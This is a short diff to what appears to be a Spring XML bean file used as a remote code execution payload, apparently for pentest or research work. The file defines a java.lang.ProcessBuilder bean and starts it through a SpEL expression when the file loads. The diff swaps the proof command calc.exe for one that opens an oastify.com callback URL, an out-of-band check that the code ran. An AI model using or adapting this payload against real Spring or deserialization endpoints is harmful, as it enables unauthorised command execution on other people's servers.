@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="calc.exe" />
+     <constructor-arg value="explorer.exe https://3nr5dk5uuy4eoi5ro70jhdg2ktqked22.oastify.com" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
